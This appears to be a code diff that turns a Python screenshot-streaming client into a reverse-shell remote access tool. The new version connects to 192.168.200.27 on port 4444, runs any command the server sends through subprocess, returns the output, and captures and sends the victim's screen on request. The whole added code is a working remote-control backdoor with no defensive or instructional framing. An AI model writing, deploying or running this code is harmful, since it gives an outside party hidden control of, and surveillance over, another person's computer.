@@ -1,46 +1,30 @@
-import sys
-from PyQt5.QtWidgets import QApplication
-from PyQt5.QtGui import QImage, QPixmap
-from PyQt5.QtCore import QBuffer, QIODevice
-import pyautogui
 import socket
+import subprocess
+import pyautogui
 import io
 
-def capture_screenshot():
-    # Capture the screenshot
-    screenshot = pyautogui.screenshot()
-    # Convert to QImage
-    img = QImage(screenshot.tobytes(), screenshot.width, screenshot.height, screenshot.width * 3, QImage.Format_RGB888)
-    return img
-
-def send_screenshot(client_socket):
-    try:
-        # Capture the screenshot
-        img = capture_screenshot()
-        
-        # Save QImage to a QBuffer (in-memory buffer)
-        buffer = QBuffer()
-        buffer.open(QIODevice.ReadWrite)
-        img.save(buffer, 'PNG')
-        buffer.seek(0)
-        
-        # Send the image data
-        image_data = buffer.readAll()
-        client_socket.sendall(image_data)
-    except Exception as e:
-        print(f"Error capturing or sending screenshot: {e}")
-
-def main():
-    # Connect to the server
-    ip = "172.26.136.52"  # Replace with your server's IP address
-    port = 4444
+def connect_to_server():
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client_socket.connect((ip, port))
-
-    # Send screenshots periodically
+    client_socket.connect(("192.168.200.27", 4444))
+    
     while True:
-        send_screenshot(client_socket)
+        command = client_socket.recv(1024).decode()
 
-if __name__ == '__main__':
-    app = QApplication(sys.argv)
-    main()
+        if command.lower() == "exit":
+            break
+
+        if command.lower() == "screenshot":
+            screenshot = pyautogui.screenshot()
+            img_byte_arr = io.BytesIO()
+            screenshot.save(img_byte_arr, format='PNG')
+            client_socket.send(b"SCREENSHOT" + img_byte_arr.getvalue())
+        else:
+            output = subprocess.getoutput(command)
+            if len(output) == 0:
+                output = "Command executed."
+            client_socket.send(output.encode())
+
+    client_socket.close()
+
+if __name__ == "__main__":
+    connect_to_server()
